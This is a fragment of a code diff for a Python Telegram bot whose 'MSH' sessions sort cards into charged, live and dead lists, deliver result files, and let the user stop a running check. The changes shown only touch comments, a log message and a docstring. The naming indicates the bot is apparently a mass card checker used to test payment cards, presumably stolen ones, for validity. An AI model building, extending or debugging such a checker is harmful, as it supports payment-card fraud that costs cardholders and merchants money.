         count = len(sess.get("charged_cards", [])) + len(sess.get("live_cards", []))
     elif rtype == "dead":
         count = len(sess.get("dead_cards", []))
-    else:  # "all"
+    else:
         count = (len(sess.get("charged_cards", [])) + len(sess.get("live_cards", [])) +
                  len(sess.get("dead_cards", [])))
 
@@ -1384,7 +1365,7 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer(f"❌ No {rtype} cards yet", show_alert=True)
         return
 
-    # Acknowledge the tap so Telegram stops showing the loading spinner
+    # Acknowledge the tap with a visible message (only answer on success path)
     await query.answer(f"📦 Preparing {rtype} file…")
 
     user_obj   = sess.get("user_obj")
@@ -1406,7 +1387,7 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 caption=capt, parse_mode="HTML",
             )
         except Exception as e:
-            logging.error(f"[MSH] send_document failed: {e}")
+            logging.error(f"[MSH] send_document: {e}")
             try:
                 await query.message.reply_text(f"❌ Could not send file: {e}", parse_mode="HTML")
             except Exception:
@@ -1414,8 +1395,11 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    FIX 2: Stop NEVER checks _is_locked.
+    The user must always be able to stop a running check immediately.
+    """
     query = update.callback_query
-    # mshs_{sid}
     parts = query.data.split("_", 1)
     sid   = parts[1] if len(parts) == 2 else ""
     sess  = MSH_SESSIONS.get(sid)
@@ -1423,14 +1407,10 @@ async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("⚠️ Session not found", show_alert=True); return
     if query.from_user.id != sess.get("user_id"):
         await query.answer("❌ No permission", show_alert=True); return
-    # Stop NEVER locks — user must be able to stop at any time
     if sess["status"] != "CHECKING":
         await query.answer("ℹ️ Already stopped", show_alert=True); return
 
-    # Mark STOPPED first so all workers see it on their next iteration
     sess["status"] = "STOPPED"
-
-    # Cancel every pending asyncio task immediately
     cancelled = 0
     for t in sess.get("tasks", []):
         if not t.done():
